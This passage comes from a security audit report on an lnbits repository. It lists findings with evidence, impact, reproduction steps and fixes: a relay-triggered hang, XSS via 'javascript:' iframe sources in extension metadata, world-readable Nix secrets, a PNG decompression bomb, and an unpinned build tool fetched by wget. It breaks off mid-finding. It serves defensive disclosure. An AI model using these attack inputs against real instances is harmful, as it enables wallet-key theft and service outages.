   _on_closed_message(): the relay-supplied sub_id from a ['CLOSED', sub_id, reason] frame is passed to _close_subscription_by_subid(sub_id, send_event=False); the returned subscription and its future are discarded, nothing calls set_exception/set_result.
2. [lnbits/wallets/nwc.py:871–900](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L871-L900)
   _close_subscription_by_subid() pops the entry out of self.subscriptions (line 892) and sets closed=True but never resolves subscription['future'].
3. [lnbits/wallets/nwc.py:943–986](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L943-L986)
   _handle_timeouts() sweeps only self.subscriptions.values(); a popped subscription is invisible to it, so the 'timed out' exception that normally unblocks callers (lines 971-974) is never raised. Its own comment (952-958) states this sweep exists so callers never 'await forever ... which requires a process restart'.
4. [lnbits/wallets/nwc.py:1312–1378](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L1312-L1378)
   call() sends REQ+EVENT and then does `return await future` with no timeout of its own; create_invoice, status, _get_status_via_transactions and _fetch_incoming_transactions all block here. No reconnect or close() path resolves orphaned futures.
5. [lnbits/wallets/nwc.py:747–756](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L747-L756)
   paid_invoices_stream() awaits _maintain_pending_invoices() (conn.call for list_transactions / lookup_invoice) without a timeout; a hung call() stalls the fundingsource_invoice_producer permanent task, so stream-based crediting of incoming payments stops.
6. [lnbits/task\_manager.py:387–400](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/task_manager.py#L387-L400)
   _catch_everything_and_restart() restarts a permanent task only when func() raises; a coroutine suspended on a never-resolved future never raises, so fundingsource_invoice_producer and check_pending_payments are not restarted and stay hung until process restart.
7. [lnbits/wallets/nwc.py:1046–1080](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L1046-L1080)
   Same defect on the response path, included for fix completeness: _close_subscription_by_eventid() pops the matched subscription before decryption/result_type/'Malformed response' validation; an exception there leaves the future unresolved. This variant needs a signed event from the NWC service (the funding backend, trusted by design), so it is a robustness issue rather than the attack path.

## Impact
A single frame per in-flight request permanently stalls the awaiting coroutine: invoice creation requests hang, status/balance checks hang, and once the paid-invoice producer or check_pending_payments task is hit, stream-based crediting of incoming payments and pending-payment reconciliation stop until LNbits is restarted (task_manager restarts only on exception). The stall persists after the relay recovers. No data is disclosed or altered.

## Reproduction steps
1. The attacker is the configured Nostr relay (or an on-path party able to inject frames into the relay websocket). After observing LNbits' REQ it sends one ['CLOSED', sub_id, 'x'] frame; CLOSED frames are not signed, so no key is needed. The affected call() then hangs forever. The threat model lists Nostr relays among adversarial remote servers whose crafted data is in scope, and nwc.py:1010-1012 itself says 'do not trust relays'. Requirement: the operator has chosen NWCWallet as funding source (a documented option) and the attacker controls or has compromised its relay, a privileged network position, hence AT:PRESENT. Benign relays enforcing NIP-42 auth or REQ limits trigger the same hang accidentally.

## Recommended fix
Subscriptions are removed from the timeout-swept registry (by relay CLOSED in _on_closed_message/_close_subscription_by_subid, and by the response handler before validation) without resolving the awaiting future, so call() waits on an event that can never occur. Fix criteria: Every path that removes or closes a request subscription must resolve its future (set_exception on CLOSED or validation failure) before or as it is removed, and call()/get_info() should additionally bound their own wait (e.g. asyncio.wait_for with subscription_timeout) so no single lost bookkeeping path can hang a caller. Verify: after the relay sends ['CLOSED', <sub_id>] for an in-flight request, call() raises within subscription_timeout; a response event whose content fails decryption or validation likewise makes call() raise; paid_invoices_stream and check_pending_payments keep iterating afterwards.

---
**Severity:** HIGH
**Status:** Open
**Category:** Denial of service: unbounded wait triggered by specific input
**CWE:** [CWE-1088](https://cwe.mitre.org/data/definitions/1088.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257549

---

# Extension author's details JSON framed as iframe src and hrefs: XSS in catalogue details dialog

## Details
The extensions catalogue lets any logged-in user open a details dialog for any listed extension (`showExtensionDetails`, extensions.vue:137-145/178-186/372-384; the page is gated only by check_user_exists, generic.py:189/208, and extensions.js:183-184 exposes `latestRelease.details_link` to every user). The dialog is populated from `GET /api/v1/extension/{ext_id}/details?details_link=...` (no auth dependency on the route or router), which checks only that `details_link` equals a release's details_link, fetches it and returns the remote JSON as an untyped dict with just `icon` and `repo` overwritten (extension_api.py:276-298, models/extensions.py:485-500). For every GitHub repository entry in a configured manifest, `details_link` is `https://raw.githubusercontent.com/{org}/{repo}/{tag}/config.json` (models/extensions.py:84-86, 417): a file the extension's repository maintainers write and can change with any new tag, without any action on the LNbits instance. The project's own test (`test_extension_details_render_in_isolated_frame`) already treats this JSON as hostile for `description_md`, which is routed through a sandboxed srcdoc iframe with CSP.

The template nonetheless binds other fields of the same JSON into navigation sinks with no scheme check:

1. `images[].link` -> `<q-video v-if="image.link" :src="image.link">` (extensions.vue:1275-1279). Quasar 2.32.2's QVideo renders `h('iframe', {src: t.src, ...})` with no `sandbox` attribute (vendored quasar.umd.prod.js), and Vue 3.5.44 does not sanitise URL schemes in attribute bindings. With `images: [{"uri": "https://x/a.png", "link": "javascript:..."}]` the iframe is created the moment the dialog opens (slide 0 is active), and the browser runs the `javascript:` URL in the iframe's initial about:blank document, which inherits the LNbits origin. No CSP is set on core pages (the only CSP is on the /library resource route, generic.py:79). The script can read `parent.window.g.user` (adminkey/inkey of every wallet of the victim, base.html:105, base.js:48-49) and issue same-origin, cookie-authenticated requests as the victim. With a non-`javascript:` value the author instead frames an arbitrary page inside the trusted dialog (phishing / clickjacking surface).
2. Secondary sinks with the same root cause: `contributors[].uri` -> `<a :href target=_blank rel=noopener>` and `repo` -> `<q-btn type="a" :href>` (extensions.vue:1322-1350), and in the admin manage dialog `release.html_url` -> `<a :href target=_blank>` (extensions.vue:785-793, the manifest author's string for explicit releases). These accept any scheme; because the anchors carry rel=noopener, a `javascript:` href does not execute in the LNbits origin in current browsers, so these are attacker-chosen link targets presented as trusted rather than script execution.

Attack: the maintainer of any extension repository listed in a configured manifest (or anyone who compromises such a repository or a manifest host) publishes a tag whose config.json carries the payload. Any user of any LNbits instance using that manifest who clicks the extension's icon, name or 'more' button executes attacker script in their session. An ordinary user loses control of all their wallets (keys in `window.g.user`). An admin victim additionally hands the attacker everything check_admin allows: reading every EditableSettings field (funding-source credentials, auth settings) and `POST /api/v1/extension` to install a Python extension — in-process code execution — without the admin ever choosing to install the attacker's extension; the shipped 'Python extensions have full server access. Trust the source.' guidance covers installation, not viewing a catalogue entry.

Assumptions: Vue 3.5.44 (package.json) does not sanitise URL schemes in attribute bindings (documented in Vue's security guide); Quasar 2.32.2 QVideo behaviour as read from the vendored bundle; browsers execute `javascript:` iframe `src` in the embedding origin (standard behaviour).

## Evidence
1. [lnbits/templates/pages/extensions.vue:1269–1280](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/extensions.vue#L1269-L1280)
   The details dialog's carousel renders `<q-video v-if="image.link" :src="image.link">` for every entry of `selectedExtensionDetails.images`. QVideo is an `<iframe>` whose `src` is this remote-controlled string; no scheme check, no sandbox. The first slide (slide=0) is active as soon as the dialog opens, so no further interaction is needed. `:img-src="image.uri"` on the same element is remote too (background-image only).
2. [lnbits/static/js/pages/extensions.js:673–697](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/pages/extensions.js#L673-L697)
   showExtensionDetails() GETs `/api/v1/extension/${extId}/details?details_link=...` and assigns the response object verbatim to `selectedExtensionDetails` (only `description_md` is routed through the hardened srcdoc path). `images`, `contributors`, `repo` are bound raw by the template.
3. [lnbits/static/vendor/quasar.umd.prod.js:16](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/vendor/quasar.umd.prod.js#L16)
   Quasar 2.32.2 (package.json pins 2.32.2) QVideo: `h('iframe', {src: t.src, title, fetchpriority, loading, referrerpolicy, frameborder:'0', allowfullscreen:true})` - a bare iframe with no `sandbox` attribute, inside the LNbits document. A `javascript:` src is executed by the browser in the iframe's initial about:blank document, which inherits the LNbits origin.
4. [lnbits/core/views/extension\_api.py:276–297](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extension_api.py#L276-L297)
   The details endpoint only checks that details_link equals a release's details_link, then returns `fetch_release_details()`'s raw dict to the client, overwriting just `icon` and `repo`. No filtering of `images[].link`, `contributors[].uri` or any other key.
5. [lnbits/core/models/extensions.py:84–85](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L84-L85)
   For every GitHub repo listed in a manifest (the default lnbits-extensions and lnbits-extensions-wasm manifests list many third-party repos) details_link is `https://raw.githubusercontent.com/{org}/{repo}/{tag}/config.json`: a file written by the extension author and changeable at any tag or new release without any action on the LNbits instance. For explicit manifest releases it is copied verbatim from the manifest (:438).
6. [lnbits/core/models/extensions.py:485–499](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L485-L499)
   fetch_release_details() returns the remote JSON as an untyped dict (`resp.json()`), so arbitrary keys and values chosen by the author reach the browser unchanged.
7. [lnbits/templates/pages/extensions.vue:1319–1350](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/extensions.vue#L1319-L1350)
   Secondary sinks in the same dialog: `<a :href="contributor.uri" target=_blank rel=noopener>` and `<q-btn type="a" :href="selectedExtensionDetails.repo">` bind remote strings (contributors from the details JSON; repo from the manifest's explicit `repo` field) without a scheme allow-list; javascript:/data: URLs are not rejected. Execution of javascript: hrefs in a noopener popup is browser-dependent; at minimum these are attacker-chosen link targets presented as trusted.
8. [lnbits/templates/pages/extensions.vue:137–144](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/extensions.vue#L137-L144)
   Entry point for any user: clicking the extension icon (also the name at :178-186 and the 'more' button at :372-384, shown whenever a details_link exists) calls showExtensionDetails(). Nothing here is admin-gated; the 'all' tab lists every catalogue extension to every user.
9. [lnbits/core/views/generic.py:189–214](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/generic.py#L189-L214)
   `/extensions` is served with only `check_user_exists`, so every logged-in account (and every admin) is a potential victim.
10. [lnbits/templates/pages/extensions.vue:785–792](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/extensions.vue#L785-L792)
   Related manifest-sourced sink in the admin manage dialog: `<a :href="release.html_url" target=_blank>` 'Release notes'. For GitHub releases html_url comes from the GitHub API; for explicit manifest releases it is the manifest author's string (models/extensions.py:437). Same missing scheme allow-list.
11. [tests/unit/test\_wasm\_extension\_frontend.py:106–124](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/unit/test_wasm_extension_frontend.py#L106-L124)
   The maintainers' test shows they treat the details JSON as hostile: it asserts description_md is no longer rendered with v-html and must go through a sandboxed srcdoc iframe with CSP. The same JSON's `images[].link`, `contributors[].uri` and the manifest `repo`/`html_url` fields received no equivalent treatment.

## Impact
Script in the victim's authenticated LNbits session: `window.g.user` exposes adminkey/inkey of every wallet (full spend), and cookie-authenticated same-origin API calls run as the victim. When the victim is an admin the script can read and change every EditableSettings field and POST /api/v1/extension to install Python code into the server process, compromising the whole instance (all users' funds and data, ledger integrity, process availability). Subsequent-system impact: An admin victim's session can read every EditableSettings field via the admin settings API (established fact: funding credentials — macaroons, runes, API tokens, NWC secrets — are readable by any admin) and install an in-process Python extension, so the attacker reaches the operator's Lightning node or custodial account outside LNbits: spend and read its funds, and disrupt it by force-closing channels or changing its configuration.

## Reproduction steps
1. Attacker: the maintainer of, or someone who has compromised, a GitHub repository listed in a manifest the instance uses; no LNbits credentials are needed (PR:N). The server-side check `release.details_link == details_link` (extension_api.py:282) means an arbitrary anonymous party cannot point the endpoint at their own JSON — the payload must come from a manifest-listed repository, a specific position outside LNbits that the attacker must hold or obtain (AT:P). Delivery: push a tag whose config.json has `images[0].link = 'javascript:...'`; the server relays it unchanged. Victim (any logged-in user or admin) opens the extension's details by clicking its icon/name/'more' — a routine catalogue browse; the iframe is created immediately and the script runs in the LNbits origin. No sanitiser, CSP or sandbox to defeat; deterministic.

## Recommended fix
1. Remote, author-controlled strings from the details JSON are bound to an iframe `src` (QVideo) and to anchor `href`s without restricting the URL scheme or host, so `javascript:` (and arbitrary framed content) reaches the LNbits origin. Fix criteria: Before binding, every URL from the details document (images[].link, images[].uri, contributors[].uri, repo) and from manifests (html_url, repo, icon) must be parsed and rejected unless its scheme is http(s) (and, for embedded video, its host is on a fixed allow-list such as youtube/vimeo embeds); embedded frames must carry a restrictive `sandbox` and never share the LNbits origin. Verify that a config.json with `images:[{link:'javascript:alert(origin)'}]` and `contributors:[{uri:'javascript:alert(1)'}]` renders no iframe/link that executes and that an arbitrary https link is not framed inside the dialog.
2. The server's details endpoint relays the remote JSON as an untyped dict, so the client receives whatever keys and values the author chooses rather than a validated model. Fix criteria: GET /api/v1/extension/{ext_id}/details should parse the remote document into a typed model with URL fields validated (scheme/host) server-side and drop unknown keys, so that a malicious config.json cannot deliver non-http(s) URLs to any client. Verify with the payloads above that the response contains no javascript:/data: URLs.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** LOW
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257546

---

# NixOS module places funding secrets from `env` into world-readable systemd unit in /nix/store

## Details
The NixOS module shipped as the flake's `nixosModules.default` (flake.nix:231-234; `nix/modules/README.md` tells users to import `nix/modules/lnbits-service.nix`) exposes one configuration channel, `services.lnbits.env`, an attribute set of strings merged verbatim into `systemd.services.lnbits.environment` (lnbits-service.nix:101-108). NixOS renders that attribute into `Environment="KEY=value"` lines of the generated `lnbits.service`; the unit is a store path, world-readable by design, and the same values are returned to any local uid by `systemctl show lnbits -p Environment` / `systemctl cat lnbits`.

The module declares no `EnvironmentFile`, `LoadCredential` or `*File` option (lnbits-service.nix:109-117), its README does not mention the generic NixOS escape hatch of setting `systemd.services.lnbits.serviceConfig.EnvironmentFile` oneself, and the packaged launcher only reads a `.env` from its working directory, which the module pins to the read-only store path (flake.nix:160-163). The `env` option text points at `.env.example` as the reference for every variable, the module README directs backend configuration through `env` (README.md:113-130), and the funding-source guide it links says a backend is 'configured entirely through LNbits environment variables' (docs/guide/wallets.md:28). For the hosted and self-custodial backends the credential setting is a plain string with no file-path form (settings.py:614-715: ALBY_ACCESS_TOKEN, BLINK_TOKEN, STRIKE_API_KEY, ZBD_API_KEY, OPENNODE_KEY, LNPAY_API_KEY, PHOENIXD_API_PASSWORD, NWC_PAIRING_URL, BREEZ_LIQUID_SEED, SPARK_L2_MNEMONIC); only macaroons have a file branch (macaroon.py:27-31), and .env.example:192,199 documents the inline HEXSTRING form for those as well.

An operator who configures such a backend credential through `env`, as the module's documentation directs, therefore stores the key that spends the funding source in a world-readable file. Any unprivileged local account on the host — another shell user, a co-located service such as the nginx reverse proxy the README suggests, any compromised low-privilege daemon — reads it and can spend the node's or custodial account's funds directly against the backend, bypassing LNbits' ledger and authentication entirely. The module's own hardening (dedicated `lnbits` system user, `stateDir` and `data` created 0700, lnbits-service.nix:80-93) shows that other local principals are not meant to see LNbits secrets; the environment path undoes that boundary for the most valuable secret of all.

The finding holds when the operator supplies a backend credential (or any other secret such as AUTH_SECRET_KEY, which LNbits otherwise auto-generates into the 0700 data folder) via `env`. The one secret-safe route the project documents — enabling the admin UI and entering the funding source in the setup wizard, which persists it to the SQLite `settings` table inside the 0700 data directory (crud/settings.py:51-61) — is mentioned at README.md:169 but is not presented as the required way to handle secrets, and the module gives no way to keep an env-configured credential out of the store. Assumption: nixpkgs nixos-24.11 (flake.lock rev 50ab7937) renders `systemd.services.<name>.environment` into the unit file in the store, which is its documented behaviour and the reason nixpkgs module conventions require `*File` options for secrets.

## Evidence
1. [nix/modules/lnbits-service.nix:101–108](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/nix/modules/lnbits-service.nix#L101-L108)
   Primary sink: `cfg.env` is merged verbatim into `systemd.services.lnbits.environment`. NixOS (nixpkgs input nixos-24.11, flake.lock rev 50ab7937) renders that attrset as `Environment="KEY=value"` lines of the generated `lnbits.service`, which is a 0444 file under the world-readable /nix/store and is also returned by `systemctl show lnbits -p Environment` / `systemctl cat lnbits` to any uid.
2. [nix/modules/lnbits-service.nix:65–75](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/nix/modules/lnbits-service.nix#L65-L75)
   `env` is `attrsOf str` — the module's only configuration channel — and its option text points operators at .env.example as the reference for every variable, including backend credentials.
3. [nix/modules/lnbits-service.nix:109–117](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/nix/modules/lnbits-service.nix#L109-L117)
   serviceConfig defines no `EnvironmentFile`, `LoadCredential` or `*File` option for secrets, and pins WorkingDirectory to the read-only store path, so the launcher's cwd `.env` cannot be used either.
4. [nix/modules/lnbits-service.nix:80–93](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/nix/modules/lnbits-service.nix#L80-L93)
   The module itself establishes the local-user boundary it then breaks: LNbits runs as a dedicated system user and `stateDir`/`data` are created 0700 lnbits:lnbits, keeping `.lnbits_auth_key`, `.super_user` and the SQLite DB away from other local accounts.
5. [nix/modules/README.md:113–129](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/nix/modules/README.md#L113-L129)
   The README tells operators to configure the Lightning backend through `services.lnbits.env`; its LND example happens to use file paths, but it offers no secret-bearing alternative for backends whose credential is an inline token.
6. [docs/guide/wallets.md:28](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docs/guide/wallets.md#L28)
   The project's funding-source guide, which the module README links as the reference for all backends, states a backend wallet is 'configured entirely through LNbits environment variables' (and lists inline values such as PHOENIXD_API_PASSWORD at :302-304).
7. [lnbits/settings.py:614–714](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L614-L714)
   Hosted/self-custodial backend credentials (lnpay_api_key, blink_token, zbd_api_key, phoenixd_api_password, alby_access_token, opennode_key, spark_l2_mnemonic, nwc_pairing_url, breez_liquid_seed, strike_api_key) are plain `str` settings with no file-path indirection; only macaroons get a file branch (lnbits/wallets/macaroon/macaroon.py:27-31), and .env.example:192,199 documents the inline HEXSTRING form for those too.
8. [flake.nix:160–163](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/flake.nix#L160-L163)
   The packaged launcher loads `.env` only from `Path.cwd()`, which the module fixes to the store path, so the packaged entrypoint gives the module no file-based secret channel of its own.

## Impact
The disclosed value is the funding-source admin credential (macaroon hex, API token, seed/mnemonic, NWC secret) and possibly AUTH_SECRET_KEY if the operator set it: confidentiality HIGH. With the backend credential the attacker spends the pot backing every LNbits wallet without touching LNbits' ledger or auth, and with AUTH_SECRET_KEY forges any session including the super user's: integrity HIGH. Availability of the LNbits process itself is not directly affected. Subsequent-system impact: The credential belongs to the operator's Lightning node or hosted custodial account, a system outside LNbits; an admin macaroon or seed gives full control of that node's funds and channels (drain, close channels), so impact crosses LNbits' boundary.

## Reproduction steps
1. Attacker: any unprivileged local account or compromised co-located service on the NixOS host (AV:L, PR:L). It reads the generated unit from /nix/store or queries `systemctl show lnbits -p Environment`; no interaction, no race, no special timing (AC:L, UI:N). Attack requirement (AT:P): the operator configured a backend credential through `services.lnbits.env`, which is the only channel the module offers and the one its documentation directs, as opposed to entering it in the admin-UI wizard; which backend and which form the operator chose is outside the attacker's control.

## Recommended fix
1. The module accepts secrets only as plain strings in Nix configuration and emits them into the store-resident systemd unit, which is readable by every local account. Fix criteria: The module offers a secret-safe channel (an environment-file or systemd credential option read at service start from a root- or lnbits-owned 0600 path outside the store) and no value supplied through it appears in the generated unit, any store path, or `systemctl show lnbits -p Environment`.
2. The module's option text and README direct operators to configure backend credentials through `env` without warning that those values become world-readable. Fix criteria: The `env` option documentation and nix/modules/README.md state that `env` is for non-secret settings and name the secret-safe channel (or the admin-UI wizard) as the required way to supply macaroons, API keys, seeds and AUTH_SECRET_KEY.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cleartext Storage of Sensitive Information
**CWE:** [CWE-538](https://cwe.mitre.org/data/definitions/538.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** LOW
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257538

---

# Asset upload: PNG decompression bomb decoded synchronously exhausts memory and stalls server

## Details
create_user_asset accepts PNG/JPEG uploads up to lnbits_max_asset_size_mb (default 2.5 MB), validates them with filetype.guess plus PIL Image.open()/verify() (header and CRC checks only, no pixel decode), and then calls thumbnail_from_bytes, which runs PIL Image.open() + image.thumbnail() synchronously inside the async handler. For PNG, Pillow has no reduced-resolution draft mode, so thumbnail()/resize() calls load() and allocates the complete decoded bitmap.

Pillow's only built-in guard is the decompression-bomb check at open time: it raises DecompressionBombError only above 2 x MAX_IMAGE_PIXELS (2 x 89,478,485 = 178,956,970 pixels) and merely warns between 1x and 2x. The repository never lowers MAX_IMAGE_PIXELS. A solid-colour RGBA PNG of about 13,370 x 13,370 pixels is under that ceiling, compresses with zlib to a few hundred kilobytes (far below 2.5 MB), yet decodes to ~716 MB (178.9 M pixels x 4 bytes). An authenticated user therefore makes the server allocate ~0.7 GB and spend several seconds inflating and resizing on the asyncio event loop, during which every other request to the instance (payments, LNURL callbacks, websockets) is stalled; on small hosts (Umbrel/RPi class, 1-2 GB RAM) the process is OOM-killed. The upload can be repeated indefinitely (delete + re-upload, or multiple self-registered accounts), and the per-user asset count is checked before the decode, so it is not a mitigation.

This is amplification of a small, specifically crafted input, not volumetric load: ~0.5 MB in produces ~700 MB of allocation and seconds of event-loop blocking per request.

Assumptions about dependencies (pillow~=12.3.0, not installed here): default MAX_IMAGE_PIXELS = 89,478,485 with error only above 2x; PngImageFile.verify() does not decode pixel data; Image.thumbnail() on PNG calls load() and decodes the full frame before reduce/resize.

## Evidence
1. [lnbits/core/services/assets.py:178–194](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/assets.py#L178-L194)
   thumbnail_from_bytes opens the uploaded bytes with PIL and calls image.thumbnail(); for PNG there is no draft/reduced-resolution decode, so the full bitmap (width x height x 4 bytes for RGBA) is allocated and inflated. No pixel or dimension budget is applied and PIL.Image.MAX_IMAGE_PIXELS is never tightened anywhere in the repository, so Pillow's default ceiling (error only above ~179 M pixels) is the only bound. The function is synchronous, CPU-bound and called directly from the async handler, so it runs on the single asyncio event loop.
2. [lnbits/core/services/assets.py:66–84](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/assets.py#L66-L84)
   The only size control is len(contents) <= lnbits_max_asset_size_mb * 1024 * 1024 (default 2.5 MB), which bounds the compressed file, not the decoded pixel buffer. detect_image_mime_type/verify_pil_image only call Image.open() + verify(), which read chunk headers and CRCs without inflating IDAT data, so a sub-megabyte PNG declaring ~13,000 x 13,000 RGBA pixels passes every check and reaches thumbnail_from_bytes at line 84.
3. [lnbits/core/views/asset\_api.py:144–160](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/asset_api.py#L144-L160)
   POST /api/v1/assets is gated only by check_account_id_exists, i.e. any logged-in account. The per-user asset count (default 10) is checked before the decode and assets can be deleted via DELETE /api/v1/assets/{id} and re-uploaded, so the decode can be triggered repeatedly from one account or from additional self-registered accounts.
4. [lnbits/settings.py:349–371](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L349-L371)
   AssetSettings: image/png is in the default allowed MIME list, lnbits_max_asset_size_mb defaults to 2.5, and no setting exists for a maximum pixel count or image dimensions, so decoded size is unbounded by configuration.
5. [lnbits/server.py:58–68](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/server.py#L58-L68)
   uvicorn.Config is created without a workers argument (Docker CMD likewise), so LNbits serves every request from one process and one event loop; a multi-second synchronous decode stalls payments, LNURL callbacks and websockets for all users.

## Impact
Each crafted upload blocks the single-process asyncio event loop for seconds and allocates roughly 0.7 GB, an amplification of about 1000:1 over the bytes sent; on constrained hosts (Umbrel/RPi class) the process is OOM-killed, and on larger hosts a trickle of repeated uploads keeps the money-handling service unresponsive to every user. No confidentiality or integrity impact.

## Reproduction steps
1. Attacker self-registers (lnbits_allow_new_accounts defaults True) or uses any existing account, then POSTs a crafted sub-megabyte PNG (e.g. 13,370 x 13,370 RGBA, solid colour, ~178.8 M pixels, just under Pillow's 2 x MAX_IMAGE_PIXELS error threshold) with content-type image/png to /api/v1/assets. filetype.guess, Image.open()+verify() and the 2.5 MB compressed-size check all pass; thumbnail_from_bytes then inflates and allocates ~716 MB synchronously on the sole event loop. The slowapi default of 200 requests/minute per IP does not mitigate a request costing seconds of CPU each; repetition is via delete + re-upload or further accounts. No special configuration, race or victim interaction is needed. Dependency assumptions (pillow~=12.3.0, not installed here): MAX_IMAGE_PIXELS default 89,478,485 with DecompressionBombError only above 2x; PngImageFile.verify() does not decode pixels; Image.thumbnail() on PNG loads the full frame before reduce/resize.

## Recommended fix
1. Decoded image size is unbounded: only the compressed byte length is limited, and Pillow's default decompression-bomb threshold permits ~179 M pixels. Fix criteria: Before any pixel decode, reject images whose declared dimensions (width x height from Image.open().size) exceed a configured, modest pixel budget (e.g. a few megapixels), and/or set a strict Image.MAX_IMAGE_PIXELS for this code path. Verify that a 13,000 x 13,000 PNG under 2.5 MB is rejected with a 4xx before thumbnail generation and that memory use stays bounded.
2. CPU-bound image decoding/resizing runs synchronously inside the async request handler, so one request stalls the whole server. Fix criteria: Image validation and thumbnail generation run off the event loop (worker thread/process) with a timeout, so a slow decode cannot delay unrelated requests; verify that concurrent API requests continue to be served while a large upload is being processed.

---
**Severity:** HIGH
**Status:** Open
**Category:** Data amplification
**CWE:** [CWE-409](https://cwe.mitre.org/data/definitions/409.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257536

---

# Release AppImage built with unpinned, unverified appimagetool fetched from AppImageKit 'continuous' release

## Details
The Linux desktop release pipeline (`appimage.yml`, called from `release.yml` and `release-rc.yml` for every tag, and dispatchable by hand) builds the LNbits AppImage with a tool it fetches at run time:

```
wget https://github.com/AppImage/AppImageKit/releases/download/continuous/appimagetool-x86_64.AppImage
chmod +x appimagetool-x86_64.AppImage
